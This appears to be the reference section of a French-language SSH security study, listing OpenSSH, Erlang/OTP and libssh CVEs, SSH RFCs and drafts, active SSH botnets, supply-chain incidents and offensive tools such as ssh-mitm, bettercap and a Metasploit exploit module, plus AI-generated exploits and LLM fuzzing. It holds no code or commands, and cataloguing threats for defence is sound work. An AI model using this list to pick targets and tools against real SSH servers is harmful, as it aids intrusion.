- CVE-2025-26466 : OpenSSH 9.5p1-9.9p1, DoS pre-auth SSH2_MSG_PING
- CVE-2025-61984 : OpenSSH <= 10.0p1, RCE via injection username/ProxyCommand, CVSS 3.6
- CVE-2025-61985 : OpenSSH <= 10.0p1, caractere nul dans URIs ssh://, CVSS 3.6
- CVE-2025-32728 : OpenSSH < 10.0, contournement DisableForwarding (X11 et agent)
- CVE-2023-48795 "Terrapin" : Troncature prefixe SSH, RFC 9308 (Strict KEX)

### CVE Erlang/OTP SSH
- CVE-2025-32433 : Erlang/OTP SSH, CVSS 10.0, RCE pre-auth, CISA KEV, PoC genere par ChatGPT+Cursor

### CVEs libssh (8 CVEs fevrier 2026)
- CVE-2025-5318 : Lecture hors limites sftp_handle(), CVSS 5.4
- CVE-2025-5372 : Mismatch semantique OpenSSL, cles crypto non initialisees
- CVE-2025-14821 : Chemin config Windows C:\etc
- CVE-2026-0964 : Traversee de chemin SCP
- CVE-2026-0965 : DoS par fichiers config inattendus
- CVE-2026-0966 : Sous-depassement de tampon ssh_get_hexa()
- CVE-2026-0967 : DoS par regex inefficace
- CVE-2026-0968 : Lecture hors limites sftp_parse_longname()

### Standards et RFC
- RFC 4251-4254 : Protocole SSH
- RFC 8308 : Extension EXT_INFO
- RFC 9308 : Strict Key Exchange (contre Terrapin)
- OWASP A03:2021 : Injection
- draft-ietf-sshm-mlkem-hybrid-kex-09 : ML-KEM hybride pour SSH (IETF Last Call fev. 2026)
- draft-rpe-ssh-mldsa-02 : ML-DSA signatures post-quantiques pour SSH
- draft-miller-sshm-strict-kex-01 : Strict KEX formalisation

### Botnets SSH actifs
- SSHStalker (fev. 2026) : ~7 000 systemes Linux, scanner Go, compile malware sur place
- AyySSHush (mai 2025) : 9 000+ routeurs ASUS, persistance firmware, port 53282
- PumaBot (mai 2025) : Botnet Go IoT, brute-force SSH, detection honeypots

### Supply chain SSH
- GhostAction (sept. 2025) : 817 depots GitHub, 3 325 secrets/cles SSH exfiltres
- golang-random-ip-ssh-bruteforce : Module Go exfiltrant vers Telegram russe
- Images Docker Debian avec backdoor XZ Utils (aout 2025)

### Outils offensifs
- ssh-mitm : MITM SSH specialise
- Frida : Instrumentation dynamique
- nmap : Scan et fingerprinting SSH
- arpspoof / ettercap / bettercap : ARP spoofing pour MITM LAN
- TitanFuzz / FuzzGPT / ChatAFL / Xbow : Fuzzing IA
- LLM-Boofuzz : Fuzzing SSH par LLM (100% des 15 vulns de test, nov. 2025)
- Metasploit module CVE-2025-32433 : Exploit Erlang/OTP SSH

### Sources de donnees
- IA+SSH+TAILSCALE_COMPLEMENT_MOBILE_3_2026.md -- Sections 1-5, 8
- IA+SSH+TAILSCALE_COMPLEMENT_DESKTOP_3_2026.md -- Sections 1-5, 8
- ssh-audit.com -- Algorithmes recommandes avril 2025
- CISA KEV -- Catalogue des vulnerabilites activement exploitees
